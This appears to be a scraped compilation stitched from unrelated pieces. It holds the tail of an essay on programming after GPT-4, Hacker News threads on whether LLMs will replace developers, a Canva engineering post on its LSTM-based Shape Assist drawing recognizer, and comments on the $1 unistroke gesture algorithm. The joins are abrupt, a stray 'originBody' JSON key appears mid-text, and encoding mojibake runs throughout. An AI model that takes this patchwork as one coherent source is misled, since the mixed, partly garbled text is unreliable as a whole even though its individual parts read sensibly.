moves the computer proposes as if reading tablets from the gods. Learning chess has never been easier; studying its deepest secrets has never been more exciting. Computing is not yet overcome. GPT-4 is impressive, but a layperson can‚Äôt wield it the way a programmer can. I still feel secure in my profession. In fact, I feel somewhat more secure than before. As software gets easier to make, it‚Äôll proliferate; programmers will be tasked with its design, its configuration, and its maintenance. And though I‚Äôve always found the fiddly parts of programming the most calming, and the most essential, I‚Äôm not especially good at them. I‚Äôve failed many classic coding interview tests of the kind you find at Big Tech companies. The thing I‚Äôm relatively good at is knowing what‚Äôs worth building, what users like, how to communicate both technically and humanely. A friend of mine has called this A.I. moment ‚Äúthe revenge of the so-so programmer.‚Äù As coding per se begins to matter less, maybe softer skills will shine. That still leaves open the matter of what to teach my unborn child. I suspect that, as my child comes of age, we will think of ‚Äúthe programmer‚Äù the way we now look back on ‚Äúthe computer,‚Äù when that phrase referred to a person who did calculations by hand. Programming by typing C++ or Python yourself might eventually seem as ridiculous as issuing instructions in binary onto a punch card. Dijkstra would be appalled, but getting computers to do precisely what you want might become a matter of asking politely. So maybe the thing to teach isn‚Äôt a skill but a spirit. I sometimes think of what I might have been doing had I been born in a different time. The coders of the agrarian days probably futzed with waterwheels and crop varietals; in the Newtonian era, they might have been obsessed with glass, and dyes, and timekeeping. I was reading an oral history of neural networks recently, and it struck me how many of the people interviewed‚Äîpeople born in and around the nineteen-thirties‚Äîhad played with radios when they were little. Maybe the next cohort will spend their late nights in the guts of the A.I.s their parents once regarded as black boxes. I shouldn‚Äôt worry that the era of coding is winding down. Hacking is forever. ‚ô¶",

There may be requirements matching the available training data and the right mood the LLM has been tuned for where it delivers acceptable, then considered flawless, results (extreme example: just try \"create me hello world in language x\" will mostly deliver flawless)... and by that amateurs (not judging, just mean less exposed to variety of problems and challenges) may end up with the feeling that LLMs could do it all.But yes, any \"serious\" programmer working on harder problems can quickly derail an LLM and prove otherwise, with dozens of his simple problems each day (tried it *). It doesn&#x27;t even need that, one can e.g. prove ChatGPT (also 4) quickly wrong and going in wrong circles on C++ language questions :D, though C++ is still hard, one can also do the same with questions on the not-ultracommon Python libs.

A LLM effective enough to replace a competent human might be so expensive to train and gather data for that it will never achieve a return on investment.Last time I used ChatGPT effectively was to find a library that served a specific purpose.

But your comment doesn&#x27;t touch on the key economic question that will decide for how many people it will be this amazing new dev experience.If AI makes developers twice as productive (maybe a few years down the road with GPT-6), will this additional supply of developer capacity get absorbed by existing and new demand? Or will there be half as many developers? Or will the same number of developers get paid far less than today?These questions arise even if not a single existing dev job can be completely taken over by an AI.A secondary question is about the type of work that lends itself to AI automation. Some things considered \"coding\" require knowing a disproportionate number of tiny technical details within a narrowly defined context in order to effect relatively small changes in output. Things like CSS come to mind.If this is the sort of coding you&#x27;re doing then I think it&#x27;s time to expand your skillset to include a wider set of responsibilities. reply torginus 45 minutes agorootparentConsidering how much the craft has expanded - when in high school, I wrote an application for pocket for a small business in Borland Delphi 7. The domain knowledge I needed for that was knowing the programming environment, and a bit about Windows.Nowadays, like the rest of the full-stack &#x27;web&#x27; developers, I work on complex webapps that use Typescript, HTML, CSS, Kubernetes, Docker, Terraform, Postgres, bash, GitHub Actions, .NET, Node, Python, AWS, Git. And that isn&#x27;t even the full list.And it&#x27;s not even a flex, all of the above is used by a relatively straightforward LoB app with some hairy dependencies, a CI&#x2F;CD pipeline + a bit of real world messiness.I need to have at least a passing familiarity with all those technologies to put together a working application and I&#x27;m sure I&#x27;m not alone with this uphill struggle. It&#x27;s a staggering amount to remember for a single person, and LLMs have been a godsend. reply bryanrasmussen 1 hour agoparentprevReasons why (supposition, not necessarily in agreement, just arguments I am familiar with) -It&#x27;s because foundations are now free but nobody understands how they work anymore - or soon won&#x27;t hence the waning as opposed to disappeared. There are whole levels that a coder needed to understand in the past that recent entrants to the field do not understand, that can still subtly affect how things work, if no one understands the things the craft depends on, then the craft is waning.For anyone who started programming more than 13 years ago in the most widespread programming discipline for the past few decades (Web technologies), which in this career makes you super-old, the craft is waning because every year it becomes more and more difficult to understand the whole stack that the web depends on. Not even considering the whole stack of technologies that my first paragraph alluded to.For Frontend coders it is waning because there are ever increasing difficulties to find out how to do something someone else did by looking at their code - modern build technologies means looking at the code of a site is not worthwhile. And people were already complaining about that 13+ years ago.If you have kids or outside work responsibilities then in combination with this and the need to produce things and the ever increasing eating of stuff by software (opening new problems and business areas one might need to be cognizant of) it becomes less possible, for those not in school, to hone their craft via purposeful working. For this reason it may be that the craft is waning.Finally improving productivity is not necessarily something that correlates with improving the craft - industrialization may have improved productivity and made many products available to many people that did not have them before, but it is pretty well known that it was not beneficial to the crafts. Perhaps the feeling is the same here. reply mike_hearn 58 minutes agorootparentIsn&#x27;t this a slight over-generalization from web dev? If you learned programming in the pre-web era then you weren&#x27;t able to learn how programs work by studying the shipped artifacts, but the craft wasn&#x27;t waning, far from it.I learned HTML in the mid nineties and even then I don&#x27;t honestly recall learning very much from View Source. HTML has never been particularly easy to read even when written by the rare breed who are fanatical about \"semantic\" markup (in quotes because even so-called semantic markup doesn&#x27;t communicate much in the way of useful semantics). HTML lacks extremely basic abstraction features needed to make code readable, like (up until very recently) any kind of templating or components system, so even if you were trying to learn from Yahoo! in 1996 you&#x27;d be faced with endless pages of Perl-generated HTML boilerplate. So I think most of us learned the old fashioned way, from books, tutorials and copious amounts of fiddling. reply ugh123 1 hour agoparentprevMy sense is that the doomers in software these days are either inexperienced and lack perspective from industry shifts over the years or weren&#x27;t very good to begin with and could not build beyond basic crud and data shipping applications of varying complexity. reply girvo 57 minutes agorootparentI mean most people in most jobs are average, or below.

Nobody appears to have an answer for where all these more senior people are going to come from when we&#x27;re replacing the juniors with an LLM.People don&#x27;t magically become senior engineers, they need to get experience of the basics. Traditionally that&#x27;s done by being hired as a junior engineer and doing a few years of fairly dull work under the supervision of the more senior engineers, who gradually prod you into doing things well.Bootcamps have been somewhat filling the ever increasing void for junior positions to some extent (in the process making the barrier to entry into the industry higher for people who can&#x27;t afford to literally pay for the junior roles that used to pay them), but there&#x27;s still a chasm between someone fresh out of a bootcamp program and a developer who you can let loose on a project unsupervised. reply ugh123 1 hour agorootparentprevAgreed. The only thing to come true in the last decade about the death of software engineering from no&#x2F;low-code systems is that there were more software jobs created to build no&#x2F;low-code systems.Also see \"death of the sys admin by way of AWS and the like\" reply happytiger 1 hour agorootparentprevThat seems possible. There is a frequent bias against the new even in progressive technology circles. reply lordnacho 1 hour agoparentprevI think what will happen is what happened to hardware. You used to come across people who could do things like solder components to a board and hook up various ICs as well. Heck, I did this at uni.Now that layer of craftsmen is gone. You are either an uber-expert in how computer hardware works, or you just buy the hardware and treat it like a kind of magic.Traditionally to become an expert you went through an intermediate stage, showed your interest, and got trained. Your hobby could turn into a profession, since the step up was gentle and interested people were needed to do some of the supporting work.Nowadays if you&#x27;re going to work in a chip fab, it&#x27;s not because you were a soldering iron kid. You go through a quite long academic process that doesn&#x27;t really recruit from the ranks of the hobbyists, though of course you&#x27;d expect there to be some natural interest. But the jump isn&#x27;t gentle, you end up learning some pretty advanced things that make soldering seem like the stone age.Software has this layer of craftsmen still, though it is rapidly dying, and not just from LLMs. There&#x27;s a enormous number of people who can more or less hook up a website and make it work, without knowing everything about how exactly it does that. There&#x27;s also plenty of excel people and python scripting people who use code in their day-to-day, but can&#x27;t tell you advanced concepts. There&#x27;s a lot of modern services that make this sort of thing easier (wordpress etc), and this level of skill is very learnable by people in the developing world. It&#x27;s not like you can&#x27;t become a real expert in those parts of the world, but economically it makes sense that there are a lot of intermediately skilled there.What will happen with GPT and the like is the experts will not need as much help from the juniors. If you&#x27;re a software architect in charge of a whole system, you won&#x27;t just sketch out the skeleton of the system and then farm out the little tasks to junior coders. Maybe there are pieces that you&#x27;d farm out, but you will definitely save on the number of juniors because an LLM will give you what you need.The result being that we&#x27;ll get fewer people trained to the highest levels, but those who are will be much more productive. So those guys will indeed be entering the quantum age, but it strands a lot of people. reply cousin_it 26 minutes agorootparentYes, the same thing happened before. There was a generation that tinkered with cars, there was a generation that tinkered with radios. There was a generation that tinkered with computer hardware. And then there was a generation that tinkered with software, and now it&#x27;s going away.The real question for me is whether AI will put humans out of most intellectual work, not just programming. Then, even if AI is shared equitably and satisfies our every need, most of us become some kind of sponges that don&#x27;t need to think for a living. Or human intelligence will remain but only as a peacock&#x27;s tail, like physical strength is now.Maybe a true \"friendly AI\" would recognize the human need to be needed, for human capabilities to stay relevant, and choose to put limits on itself and other AIs for that reason. reply lordnacho 18 minutes agorootparentMaybe there will be an intellectual version of sports? Regulated to only allow actual humans, done for much the same reason as physical sports?I guess that sort of thing already exists (eg Chess). reply cousin_it 14 minutes agorootparentI think the arts are the \"peacock&#x27;s tail of the mind\".

This new copilot coding reminds me of that, throwing shit and see what sticks, without understanding why and how it works.

Similar to how old craftsmanship has been superseded by machine&#x2F;industrialisation.The need for mastery of the craft will be lesser, and so mastery of it will wane, as people depend on AI instead. Then if you ever need someone to do it without AI, you might no longer be able to find anyone with the craftsmanship know-how to do it.Also, it&#x27;ll probably bring down how good coding is as a career. As productivity enters this quantum state, you&#x27;ll need less engineers, and they&#x27;ll need less qualifications, which might translate to less jobs, worse pay, and an increased expectation in productivity that makes you dependent on AI, as you can no longer meet these expectations and compete with others if you also dont fully leverage AI. reply lifeisstillgood 34 minutes agoparentprevI have stayed away from chatGPT etc (mostly due to my work simply banning its use in an understandable conservative approach)What&#x27;s the best starting point for my personal stuff?

Here&#x27;s a seminal project proposal from 1955:\"We propose that a 2 month, 10 man study of artificial intelligence be carried out during the summer of 1956 at Dartmouth College in Hanover, New Hampshire. The study is to proceed on the basis of the conjecture that every aspect of learning or any other feature of intelligence can in principle be so precisely described that a machine can be made to simulate it. An attempt will be made to find how to make machines use language, form abstractions and concepts, solve kinds of problems now reserved for humans, and improve themselves. We think that a significant advance can be made in one or more of these problems if a carefully selected group of scientists work on it together for a summer. ‚Äú reply Miraste 2 hours agorootparentGP didn&#x27;t say that AI was easier than expected, rather that AI is easier than robotics, which is true.

US manufacturing output keeps increasing, though it&#x27;s overall share of GDP is dropping.US manufacturing jobs went overseas.What went overseas were those areas of manufacturing that was more expensive to automate than it was to hire low paid workers elsewhere.With respect to your final question, I don&#x27;t think we should treat them differently, but I do think few societies have handled this well.Most societies are set up in a way that creates a strong disincentive for workers to want production to become more efficient other than at the margins (it helps you if your employer is marginally more efficient than average to keep your job safer).Couple that with a tacit assumption that there will always be more jobs, and you have the makings of a problem if AI starts to eat away at broader segments.If&#x2F;when AI accelerates this process you either need to find a solution to that (in other words, ensure people do not lose out) or it creates a strong risk of social unrest down the line. reply specialist 3 hours agorootparentprevCapitalism always seeks to commodify skills.

LLMs have a limited context window partly because that&#x27;s the chunk size with which they&#x27;re presented with data to learn during training (and partly for computational complexity reasons).One of the reasons I&#x27;m feeling very bullish on LLMs is because if you look at the exact training process being used it&#x27;s full of what feels like very obvious low hanging fruit. I suspect a part of the reason that training them is so expensive is that we do it in really dumb ways that would sound like a dystopian hell if you described it to any actual teacher. The fact that we can get such good results from such a terrible training procedure by just blasting through it with computational brute force, strongly suggests that much better results should be possible once some of that low hanging fruit starts being harvested. reply TerrifiedMouse 4 hours agorootparentprev> LLMs in particular can be a very fast, surprisingly decent (but, as you mention, very fallible) replacement for Stack OverflowNice thing about Stack Overflow is it‚Äôs self-correcting most of the time thanks to,https:&#x2F;&#x2F;xkcd.com&#x2F;386&#x2F;GPT not so much. reply cornel_io 3 hours agorootparentprevTwo years ago we were quite a ways out from having LLMs that could competently respond to commands without getting into garbage loops and repeating random nonsense over and over.

But it can&#x27;t know the intricascies of the company I work at with all our baggage, legacy systems and us humans sometimes just being straight up illogical and inefficient with what we want.So my usage has mostly been for it to play a more advanced rubber duck to bounce ideas and concepts off of and to do some of the more tedious scripting work (that I still have to double check thoroughly).At some point GPT and other LLMs might be able to replace what I do in large parts. But that&#x27;s still a while off. reply Tainnor 1 hour agorootparentprevSame. Even for technologies that it supposedly should know a lot about (e.g. Kafka), if I prompt it for something slightly non-standard, it just makes up things that aren&#x27;t supported or is otherwise unhelpful.The one time I&#x27;ve found ChatGPT to be genuinely useful is when I asked it to explain a bash script to me, seeing as bash is notoriously inscrutable.

When the limiting factor is architectural complexity or understanding how many different components of a system fit together, it‚Äôs less useful.Still, I find I can often save time on more difficult tasks by figuring out the structure and then having GPT-4 fill in the blanks. It‚Äôs a much better programmer once you get it started down the right path. reply clnq 1 hour agorootparentMy niche is in video game programming, and I am very specialized in a specific area. So I might ask things like how would one architect a certain game system with a number of requirements, to meet certain player expectations, and be compatible with a number of things.Unfortunately, it hasn‚Äôt been helpful once, and often due to the same reason - when the question gets specific enough, it hallucinates because it doesn‚Äôt know, just like in the early days.Moreover, I am a domain expert in my area, so I only ask for help when the problem is really difficult. For example, when it would take me several days to come up with an answer and a few more weeks to refine it.Game development has a lot of enthusiasts online sharing material, but most of this material is at junior to intermediate level. You very quickly run out of resources for questions at a principal level, even if you know the problems you have have been solved in other AAA companies.You have to rely on your industry friends, paid support from middleware providers, rare textbooks, conferences, and, on the off-chance that anything useful got scooped up into the training data set - GPT.

Code sucks. reply creesch 4 hours agorootparentWhile I don&#x27;t want to go as far as saying that it sucks, I do largely agree with the sentiment. Personally, I do like coding a little bit but mostly as a puzzle but for the most part it is a means to an end.Lately, I have been using ChatGPT and the OpenAI API to do exactly that for a few projects. I used it to help me round out the design, brainstorm about approaches, tune database requirements, etc. I basically got to the point where I had a proof of concept for all the separate components in a very short amount of time. Then for the implementation it was a similar story. I already had a much more solid idea (technical and functional design, if you will) of how I wanted to implement things than I normally do. And, for most of the things where I would get slowed down normally, I could just turn to the chat. Then by just telling it what part I had trouble with, it would get me back on track in no time.Having said all that, I couldn&#x27;t have used it in such a way without any knowledge of programming. Because if you just tell it that you want to \"create an application that does X\" it will come up with overly broad solution. All the questions and problems I presented to it were based from a position where I already knew the language, platform and had a general sense of requirements. reply Xelynega 2 hours agorootparentprevI think LLMs are the wrong solution for this problem.Why make something that produces low level code based off of existing low level code instead of building up meaningful abstractions to make development easier and ensure that low level code was written right?Basically react and other similar abstractions for other languages did more to take \"coding\" out of creating applications than gpt ever will IMO. reply firecall 1 hour agorootparentprevI rather enjoy making things, or solving problems.But my favourite bit is refining and optimising the code!Finding the patterns and abstractions I can make to DRY it out.That&#x27;s the bit I like :-)Wrestling APIs and trying to understand inadequate documentation is the worst part! reply DrSiemer 4 hours agorootparentprevMany designers despise AI generated images, because they love the process itself.

I have an elementary understanding of French and so when I see a passage machine translated into French (regardless of software, Google Translate or DeepL) I cannot find any mistakes; I may even learn a few new words. But to the professional translator, the passage is full of mistakes, non-idiomatic expressions and other weirdness. You aren&#x27;t going to see publishers publishing entirely machine translated books.I suspect the same thing happens for LLM-written programs. The average person finds them useful; the expert finds them riddled with bugs. When the stakes are low, like tourists not speaking the native language, machine translation is fine.

It seems much more likely that the amount of errors will trend downwards but never quite reach zero. How could it be otherwise? AIs are not magic god-machines, they have a limited set of information to work with just like the rest of us (though it might be larger than humans could handle) and sometimes the piece of information is just not known yet.Let&#x27;s say that in a few years the amount of correct code becomes 99% instead of ~80%. That is still an incredible amount of bugs to root out in any decently sized application, and the more you rely on AI to generate code for you the less experience with the code your human bugfixers will have. This is in addition to the bugs you&#x27;d get when a clueless business owner demands a specific app and the AI dutifully codes up exactly what they asked for but not what they meant. It&#x27;s quite likely that an untrained human would forget some crucial but obscure specifications around security or data durability IMO, and then everything would still blow up a few months later. reply kragen 8 hours agorootparentprevthey already could, they just had to debug it, which is twice as hard as writing the code in the first place reply girvo 25 minutes agorootparentAnd debugging code that you didn‚Äôt write at all is X times as hard, and X is a lot more than two in my experience reply bugglebeetle 8 hours agorootparentprevRequesting a basic or complex program still requires breaking down the problem into components a computer can understand.

THEN I can ask it a follow-up question. That was not possible before with Google.I can ask exactly what I want in English, not by entering a search-term. A search-term is not a question, but a COMMAND: \"Find me web-pages containing this search-term\".By asking exactly the question I&#x27;m looking the answer to I get real answers, and if I don&#x27;t understand the answer, I can ask a follow-up question.

Nothing I couldn&#x27;t have easily done myself, but something I was happy I didn&#x27;t have to.For people who are content doing low level, low skilled coding, though, it will be a threat unless they learn how to use it to take a step up. reply 59nadir 1 hour agorootparentWhat do you mean by \"low level\" here? In the commonly accepted terminology I would take this to mean (nowadays) something that concerns itself more with the smaller details of things, which is exactly where I feel that current AI fails the most.

We&#x27;re probably going to have to rethink it.It made a lot of sense when we were all worried about the same things, e.g. not starving. In such a world, anything you could trade for food was objectively valuable because you could use it to fend off starvation--and so could everybody else.But if efficiencies improve to a point where we can easily meet everybody&#x27;s basic needs, then the question of whether progress towards a particular goal counts as value becomes less clear, especially if it&#x27;s a controversial goal.I imagine that whether we write the code or not will have more to do with how we feel about that goal and less to do with how many shiny pebbles we&#x27;re given in exchange. reply Xelynega 1 hour agorootparentprevWho&#x27;s paying those programmers to solve those problems you&#x27;ve identified the market doesn&#x27;t care about?It sounds like that would require an economic shift more than \"just add chatgpt\" reply c2occnw 6 hours agorootparentprevWhen we get to that point -- beyond a machine regurgitating reasonable facsimiles of code based on human examples, but actually designing and implementing novel systems from the ground up -- we&#x27;ll need far, far fewer workers in general. reply briHass 5 hours agorootparentExactly.

It often looks more like R&D, bespoke architecture or optimization, and soft-skill organizational politicking. So LLM‚Äôs can‚Äôt really collect enough data to learn to synthesize it with worthwhile accuracy.LLM code assistants might accelerate some of our daily labor, but as a technology, it‚Äôs not really architected to replace our work.But the many juniors who already live by Google searches and Stack Overflow copypasta, are quite literally just doing the thing that LLM‚Äôs do, but for $150,000 instead of $150. It‚Äôs their jobs that are in immediate jeopardy. reply bdangubic 6 hours agorootparentEvery senior person thinks just like you do... The fact that you \"earned (y)our senior roles rather than just aged into them\" has nothing to do whether or not your skills can be replaced technology like LLM&#x27;s. Chances are that you most likely earned your senior role in a specific company &#x2F; field and your seniority has less to do with your technical skills but more with domain knowledge.Truth is that there aren&#x27;t many people that are like you (3rd&#x2F;4th decade in the industry) who don&#x27;t think exactly like you do. And truth is that most of you are very wrong ;) reply pdimitar 5 hours agorootparentCare to clarify why is your parent wrong? They said that LLMs can&#x27;t be trained on what&#x27;s not publicly available, and a lot of it is deeper knowledge. What&#x27;s your retort? reply mikepalmer 2 hours agorootparentContext: LLMs learn all the amazing things they do by predicting the next token in internet data. A shocking amount can be inferred from the internet by leveraging this straightforward (I won&#x27;t say \"simple\"!) task. There was not explicit instruction to do all that they do - it was implied in the data.The LLM has seen the whole internet, more than a person could understand in many lifetimes. There is a lot of wisdom in there that LLMs evidently can distill out.Now about high level engineering decisions: the parent comment said that high level experience is not spelled out in detail in the training data, e.g., on stack overflow. But that is not required. All that high level wisdom can probably also be inferred from the internet.There are 2 questions really: is the implication somewhere in the data, and do you have a method to get it out.It&#x27;s not a bad bet that with these early LLMs we haven&#x27;t seen the limits of what can be inferred.Regarding enough wisdom in the data, if there&#x27;s not enough, say, coding wisdom on the internet now, then we can add more data. E.g., have the LLMs act as a coding copilot for half the engineers in the world for a few years. There will be some high level lessons implied in that data for sure. After you have collected that data once, it doesn&#x27;t die or get old and lose its touch like a person, the wisdom is permanently in there. You can extract it again with your latest methods.In the end I guess we have to wait and see, but I am long NVDA! reply FeepingCreature 2 hours agorootparentprevNot parent, but this presumes that the current split between training and inference will hold forever. We&#x27;re already seeing finetunes for specific domains.

    "originBody": "Engineering Blog OverviewSubscribe Discover more UI/UXBackendMachine LearningInfrastructureSecurityEngineering PracticesData Platform About Canva Algorithms Ship Shape How Canva does hand-drawn shape recognition in the browser Kerry Halupka, Rowan KatekarNov 10, 2023 Introduction Millions of Canva users worldwide have unleashed their creativity with our new Draw tool, which lets you add customized drawings to your design to make them stand out. However, if you‚Äôre anything like us, even a simple straight line drawn with a mouse or a trackpad can end up looking like a path trod by a tipsy squirrel. Don‚Äôt even get us started on circles and rectangles. So when we set out to plan the draw tool, we knew we‚Äôd need to lend a hand to those of us lacking surgeon levels of steadiness. So we built Shape Assist, which uses machine learning (ML) to turn a shaky scribble into a sleek vector graphic (you can thank us later). Shape Assist in action Design considerations In developing the feature, we kept classification latency at the forefront of our minds. We wanted to make sure the experience was snappy but still accurate. Therefore, we decided to deploy the solution in the browser, which allows for real-time shape recognition and drawing assistance, providing a seamless and interactive user experience. Users can draw shapes and receive immediate feedback without experiencing delays associated with server-based processing. This enhances the overall usability and responsiveness of the shape assist tool, making it more enjoyable and efficient for users. Furthermore, running the shape assist ML model in the browser eliminates the need for continuous internet connectivity, making it accessible even in offline scenarios. People can use the shape assist tool without depending on internet connectivity, which can be especially useful in situations with limited or unreliable internet access. In the initial development of Shape Assist in Canva, we used computer vision heuristics to identify and recognize shapes drawn by users. We based these heuristics on pre-defined rules and thresholds to detect specific shapes, such as rectangles, circles, and triangles, by analyzing geometric properties of the cartesian coordinates of the points. While this approach provided some basic shape recognition capabilities, it had limitations when adding new shapes or handling more complex shapes. While we had already decided to limit the initial implementation to shapes people could draw with a single stroke, our proposed shape list included some that were too complex for our initial approach to handle (like clouds, stars, and hearts). To overcome these limitations and provide a more versatile and accurate shape recognition system, we decided to switch to an ML model. ML models can learn from a large dataset of user-drawn shapes and can adapt and generalize to new shapes, styles, and variations. This allowed us to expand the capabilities of shape assist beyond simple geometric shapes to more complex and custom shapes, making it a more robust and flexible tool for users. We designed the feature to replace the shape drawn by a user if they held down the cursor in place for at least a second after drawing. However, we also wanted to be able to keep the shape as is, without automatic replacement, if it didn't closely match any of the predefined classes. Developing the ML model for Shape Assist involved several key steps. First, we collected a large dataset of user-drawn shapes, capturing a wide range of styles and variations. Next, we used the heavily augmented dataset to train a neural network, with preprocessing to handle user drawing style differences. Finally, we deployed the ML model in the browser using customized inference code to minimize the bundle footprint. The result is a super snappy feature that accurately identifies shapes drawn by different users. Gathering the data As all ML Engineers will know, the basis for a successful ML model is data, so we paid special attention to collecting and curating our dataset. We wanted to make sure Shape Assist would be delightful to diverse users, so we collected drawing data from anyone who agreed to sit still long enough to hold a mouse. We invited intrepid Canvanauts to unleash their creative spirit and draw single-stroke shapes in a simple user interface. We recorded the strokes made by users as a series of x and y coordinates, which allowed us to collect a diverse set of user-generated data, with each shape represented as a sequence of coordinates. Using coordinates to record the strokes provided us with the flexibility to preprocess the data and perform various data augmentation techniques, further improving the model's ability to generalize. If the shapes were recorded as binary images rather than x and y coordinates, then spatial augmentations such as flipping, rotating and shearing could be applied. But by recording the data as coordinates we can also apply augmentations such as random deletion of coordinates, random jittering of point location, reversal of point order, among others. Canvanauts love a chance to get involved and help out other teams, so even just from volunteer efforts, we managed to collect a sizeable dataset. However, we quickly learned that our engineers and designers aren‚Äôt very representative of the average Canva user. For example, ML engineers have a penchant for providing adversarial data, and our designers are so talented we could probably sell their doodles (we even instructed some to draw with their non-dominant hand to make it fairer for the rest of us mere mortals). Thankfully, after providing some stricter guidelines and expectations, we obtained a sizeable dataset. Designing and training the model Since we wanted the ML model to run client-side, and we didn't want to have a detrimental impact on page load time, we needed to keep the size of the model to a minimum. Therefore, instead of using a Convolutional Neural Network (CNN) that required converting the points into pixels, we decided to experiment with a Recurrent Neural Network (RNN), which directly used the strokes' x and y coordinates. To accurately represent the shape in pixels, we required approximately 20x20 pixels. This results in a large, sparse image or vector (400 elements). However, using Cartesian coordinates, we found we could use far fewer elements while still maintaining good performance. To identify the optimal model attributes, we performed a hyperparameter sweep, tweaking various parameters such as input size, number of layers, and number of features in the hidden state. We tried different combinations to find the sweet spot for our Shape Assist model. One challenge we encountered while developing the Shape Assist model was that different users draw at different speeds. This resulted in varying lengths of the list of points describing a given shape, with more points in the list for users who draw slowly than those who draw quickly. To ensure the model could generalize well to different drawing speeds, we needed to fix the number of points representing each shape. While we could use piecewise linear interpolation to evenly distribute points, we found this approach tended to remove key points, resulting in a loss of important detail. Instead, we developed a variation on the Ramer-Douglas-Peucker (RDP) algorithm, which is a curve simplification algorithm that reduces the number of points in a curve while preserving its important details. It achieves this by recursively removing points that deviate insignificantly from the simplified version of the curve. Original data points versus simplified data using linear interpolation versus RDP simplification. RDP simplification maintains high-frequency details (such as the sharp corner circled in the image), while linear interpolation can erase these important details. Adding to the complexity of training the model, we knew that we wanted the option of rejecting the model prediction if the shape didn't closely resemble one of the predefined classes. Given that only one shape could be correct at a time, a softmax activation function, combined with a cross-entropy loss, was the obvious choice. We could reject the prediction if the confidence associated with the highest-probability class was below a given threshold. However, we found that this approach led to models with high confidence, even when wrong. Therefore, we opted instead to train the model as a multi-class multi-label classifier, using sigmoid activation functions on each output class, and rejecting the prediction if no classes were above a given threshold. Using a softmax activation function results in an overly confident model even when wrong. We achieved better performance with sigmoid activation functions for all classes followed by thresholding. Deployment trade-offs Once we had decided on the appropriate architecture and carefully trained the model, it was time to put it in the hands of our users. Often ML models are large and computationally intensive, so they live on powerful (expensive) computers in the cloud. As it turns out, our model is pretty small and contains only a few mathematical operations, which allowed us to consider running all the processing inside the client application. With this approach, we eliminated the need for a connection to the server - the feature works entirely offline. As a bonus, eliminating the round-trip time to the server means that we recognize shapes almost instantaneously. Model architecture So, exactly how big is the model, and what operations does it do? Let‚Äôs draw it (with itself)! The model architecture, drawn with the help of Shape Assist. From these beautifully polished rectangles and arrows, you can see that we arrived at a structure consisting of a single Long Short Term Memory (LSTM) layer, followed by a General Matrix Multiply (Gemm, also known as a Dense or Fully Connected layer). This diagram shows some important configuration variables: Number of interpolated points: P = 25 Hidden size: H = 100 Number of predefined shapes: N = 9 Using these values, we can derive the total number of parameters: LSTM: 4H * 2 + 4H * H + 8H = 41,600 Gemm: P * H * N + N = 22,509 Total: 64,109 With 4 bytes per parameter (IEEE754 32 bit floating point), the model is roughly 250 kilobytes in size, approximately equivalent to a single uncompressed 360p 16:9 image. We can potentially bring this down even further by storing the parameters at a lower precision. To run the model on the client, we needed a way of performing the LSTM and Gemm operations. Instead of using a general-purpose ML engine for this, we elected to build them from scratch directly in Typescript. While this approach doesn't generalize well to more complex models, it did allow us to deliver this feature quickly while keeping our options open for more sophisticated kinds of processing in the future. The resulting implementation is less than 300 lines long and runs in under 10 milliseconds on a modern laptop (about ten times faster than you can blink!). Shape replacement After using the model to determine what shape a user drew, we used a template-matching approach to accurately align the user-drawn path with a vector-graphic representation. This involves normalizing both the input shape and template shape, trying 15¬∞ rotations of the template shape, computing the first and second moments of the input points in the rotated coordinate space, and calculating dissimilarity between the input points and the template shape. The rotation with the smallest dissimilarity is selected as the optimal angle. Illustrating the template matching approach. Here various rotations of clouds are shown: 0¬∞, 15¬∞, and 45¬∞. The optimal rotation of this cloud shape was 15¬∞. Conclusion We‚Äôre super stoked to be able to share this feature with the world. We had a lot of fun building it, and whether you‚Äôre an expert designer or a scribbler, we hope you enjoy the extra sparkle it can bring to your creations.

That one works beautifully even when trained with just a single sample of each gesture.I hope $1 unistroke gets more recognition because it can be integrated in an afternoon into any project to add gesture recognition and make the UI more friendly.It works quite reliably for palm style \"Graffiti\" text entry, as long as each letter is just a single stroke. The original paper also makes great effort to be readable and understandable.https:&#x2F;&#x2F;depts.washington.edu&#x2F;acelab&#x2F;proj&#x2F;dollar&#x2F;index.html reply ajnin 18 hours agoparentA big issue with the $1 recognizer is that it requires strokes to be drawn in a specific way, for example to draw a circle you need to go counterclockwise, if you go clockwise (as seems more natural to me) it gets recognized as a caret. This makes it not really usable in a context of free drawing were the users are not aware of the details of your implementation. reply atoav 2 hours agorootparentBut this is only a potential issue if you expect users to record their own gestures and then switch direction for some reason. If you are the one to define the gestures you can just preprocess them to allow multiple directions&#x2F;orientations (or just record multiple yourself). reply jmiskovic 14 hours agorootparentprevNot an issue, just invert each recorded gesture and add it to the same symbol. reply verdverm 10 hours agorootparentThis does not scale well when your drawing is more complicated. A simple example is a square, which can start in 4 places and go 2 directions, now you have 8 samples, but it gets more complicated because some people use multi-stroke for the square.The other algos in the family are more robust to this, but after experimenting, a RNN or vision model does much better on the consistency side of things. reply jmiskovic 10 hours agorootparentWhat I meant is to add both the clockwise and counter-clockwise variant of same gesture. Rotations are another matter, $1 unistroke can be made to be either sensitive or insensitive to gesture rotation, depending what you want. Often you&#x27;d want to discern \"7\" from \"L\".Uni-stroke is much more elegant input method than multi-stroke. You can react to user&#x27;s gesture as soon as they lift the mouse button (or stylus or finger), without introducing some arbitrary delay. Users can learn and become very fast at using gestures. Multi-stroke on the other hand requires coordination of each stroke with previous ones and to me it doesn&#x27;t justify its complexity. I admit I have preference the software where users adapt and become proficient, while many products with wider audience need to be more accessible towards beginners. Different strokes... reply verdverm 9 hours agorootparentright, but for a square, you have to add 8 samples, not 2, to handle the 4 starting points and 2 directions, but this does not account for the users who multi-stroke> Different strokes...I see what you did there :] I&#x27;m definitely in the reduce user burden camp.https:&#x2F;&#x2F;quickdraw.withgoogle.com&#x2F; is a good baseline to start from for a more resilient gesture recognizer reply 1-more 14 hours agorootparentprevit thinks everything I draw is a caret. reply mcphage 14 hours agorootparent> ^^ ^^^^^^ ^^^^^^^^^ ^ ^^^^ ^^ ^ ^^^^^^I don&#x27;t understand what you&#x27;re trying to say here. reply soamv 11 hours agoparentprevPeople here testing out the example on this page and reporting errors seem to be missing the fact that this demo is \"trained\" on one example.

